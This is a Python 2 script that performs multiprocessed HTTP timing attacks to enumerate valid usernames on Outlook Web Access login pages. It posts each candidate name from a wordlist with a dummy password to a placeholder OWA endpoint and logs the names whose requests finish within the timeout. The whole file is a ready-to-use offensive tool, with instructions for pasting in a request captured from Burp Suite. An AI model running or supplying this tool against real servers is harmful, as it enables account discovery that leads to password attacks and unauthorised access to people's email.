#!/usr/bin/env python
# Multiprocessed HTTP Timing attack tester
# MAKE SURE YOU READ THE INSTRUCTIONS CAREFULLY
# I just pull the request out of burpsuite using the "Copy as Python-Requests" extension
# Und3rf10w
import requests
import threading
import time
import argparse
from sys import argv
from multiprocessing import Pool, freeze_support
import itertools

parser = argparse.ArgumentParser(prog=str(argv[0]), usage='%(prog)s [options]', description='Utility to perform timing attacks against HTTP services such as OWA')
parser.add_argument('-t', "--timeout", type=int, help="Number of seconds to wait before timing out on request", required=False, default=5)
parser.add_argument('-T', "--threads", type=int, help="Number of threads to use", required=False, default=1)
parser.add_argument('-f', "--filepath", type=str, help="Path to file containing values to fuzz", required=True)
parser.add_argument('-o', "--outfile", type=str, help="Path of file to write results to", required=False, default=None)
parser.add_argument('-d', "--debug", help="Show debugging info (implies --verbose)", required=False, default=False, action='store_true')
parser.add_argument('-v', "--verbose", help="Show verbose output", required=False, default=False, action='store_true')

args = parser.parse_args()

timeoutval = args.timeout
threads = args.threads
filepath = args.filepath
outfile = args.outfile
debug = args.debug
verbose = args.verbose

if debug == True:
	verbose = True


def main():
	assign_file_to_list(filepath) # returns fuzzvals list
	pool = Pool(threads)
	pool.map(postreq_wrapper, itertools.izip(fuzzvals, itertools.repeat(timeoutval), itertools.repeat(outfile)))


def assign_file_to_list(filepath):
	global fuzzvals
	f = open(filepath, "r")
	org_fuzzvals = f.readlines()
	fuzzvals = []
	f.close()
	for i in range(len(org_fuzzvals)):
		fuzzvals.append(org_fuzzvals[i].strip('\n'))
	return fuzzvals

def postreq_wrapper(args):
	return postreq(*args)

def postreq(fuzzval, timeoutval, outfile):
	try:
		if debug == True:
			print "DEBUG: current fuzzval %s" % str(fuzzval)
			start_time = time.time()
		# requests pulled from burpsuite extension: Copy as Python-Requests
		# ensure that you add timeout=timeoutval before the last ')' and after the last '}' in your request
		# REPLACE THE FOLLOWING LINE
		r = requests.post("https://mail.example.com:443/owa/auth.owa", headers={"User-Agent": "Mozilla/5.0 legit user agent", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Cookie": "ClientId=XXXXXXXXXXXXXXX; PrivateComputer=true", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}, data={"destination": "https://mail.example.com/owa/", "flags": "4", "forcedownlevel": "0", "username": str(fuzzval), "password": "itdoesntevenmatter", "passwordText": "", "isUtf8": "1"}, timeout=timeoutval)
		if verbose == True:
			print "INFO: Value %s succeded" % str(fuzzval)
		if debug == True:
			print("DEBUG: %s seconds for this request to complete") % (time.time() - start_time )
			print "DEBUG: Request returned %d" % r.status_code
		if outfile != None:
			o = open(outfile, "a")
			o.write(fuzzval + '\n')
			o.close()
		else:
			print "%s" % fuzzval
	except requests.exceptions.ReadTimeout:
		if verbose == True:
			print "ERROR: Value %s didn't work because the request timed out" % str(fuzzval)
		pass

if __name__=="__main__":
	freeze_support()
	main()
	
